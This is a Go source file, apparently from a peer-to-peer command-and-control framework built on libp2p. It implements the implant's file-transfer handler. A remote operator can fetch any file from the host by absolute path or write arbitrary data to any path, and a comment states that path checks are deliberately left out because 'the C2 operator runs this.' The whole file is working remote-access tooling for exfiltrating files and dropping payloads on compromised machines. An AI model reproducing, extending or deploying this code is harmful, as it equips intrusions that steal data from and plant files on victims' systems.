package command

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"

	"github.com/skoveit/skovenet/pkg/logger"
	"github.com/skoveit/skovenet/pkg/node"

	"github.com/libp2p/go-libp2p/core/network"
)

const FileProtocolID = "/mesh-c2/file/1.0.0"

// FileHeader represents the metadata sent at the start of a file stream.
type FileHeader struct {
	Cmd  string `json:"cmd"` // "fetch" or "save"
	Path string `json:"path"`
}

type FileHandler struct {
	node *node.Node
}

func NewFileHandler(n *node.Node) *FileHandler {
	fh := &FileHandler{node: n}
	n.Host().SetStreamHandler(FileProtocolID, fh.HandleFileStream)
	return fh
}

func (fh *FileHandler) HandleFileStream(s network.Stream) {
	defer s.Close()

	// Read header length (uint32) and JSON header
	// For simplicity, we decode the JSON directly from the stream.
	// Since JSON objects are self-delimiting, decoder.Decode will read just the object.
	decoder := json.NewDecoder(s)
	var header FileHeader
	if err := decoder.Decode(&header); err != nil {
		logger.Debug("❌ Failed to read file header: %v", err)
		return
	}

	logger.Debug("📂 Received file stream request: %+v", header)

	switch header.Cmd {
	case "fetch":
		// Remote node wants to fetch a file from us (Download)
		// Need to ensure safe path extraction to prevent traversing out of intended dirs if needed
		// For now, allow absolute paths as the C2 operator runs this.
		file, err := os.Open(header.Path)
		if err != nil {
			logger.Debug("❌ Failed to open file for fetch: %v", err)
			// Return error string to stream
			fmt.Fprintf(s, "ERROR: %v\n", err)
			return
		}
		defer file.Close()

		// Tell the remote end we are ready (send OK line)
		fmt.Fprintf(s, "OK\n")

		// Stream file to the remote node
		copied, err := io.Copy(s, file)
		if err != nil {
			logger.Debug("❌ Error streaming file: %v", err)
			return
		}
		logger.Debug("✅ Streamed %d bytes of %s", copied, header.Path)

	case "save":
		// Remote node wants to save a file to us (Upload)
		// the stream contents immediately following the JSON header will be the raw file data

		// Ensure directory exists
		dir := filepath.Dir(header.Path)
		if err := os.MkdirAll(dir, 0755); err != nil {
			logger.Debug("❌ Failed to create directory for save: %v", err)
			return
		}

		file, err := os.Create(header.Path)
		if err != nil {
			logger.Debug("❌ Failed to create file for save: %v", err)
			return
		}
		defer file.Close()

		copied, err := io.Copy(file, decoder.Buffered())
		if err != nil {
			logger.Debug("❌ Error saving file (buffered): %v", err)
			return
		}

		copied2, err := io.Copy(file, s)
		if err != nil {
			logger.Debug("❌ Error saving file (stream): %v", err)
			return
		}

		logger.Debug("✅ Saved %d bytes to %s", copied+copied2, header.Path)

	default:
		logger.Debug("❌ Unknown file stream command: %s", header.Cmd)
	}
}

// OpenFileStream opens a stream to the target peer for file operations.
func (fh *FileHandler) OpenFileStream(ctx context.Context, targetPeerID string, header FileHeader) (network.Stream, error) {
	target, err := fh.node.PeerManager().ParsePeer(targetPeerID)
	if err != nil {
		return nil, fmt.Errorf("invalid peer ID: %w", err)
	}

	s, err := fh.node.Host().NewStream(ctx, target, FileProtocolID)
	if err != nil {
		return nil, fmt.Errorf("failed to open file stream: %w", err)
	}

	// Send header
	encoder := json.NewEncoder(s)
	if err := encoder.Encode(header); err != nil {
		s.Close()
		return nil, fmt.Errorf("failed to encode file header: %w", err)
	}

	return s, nil
}
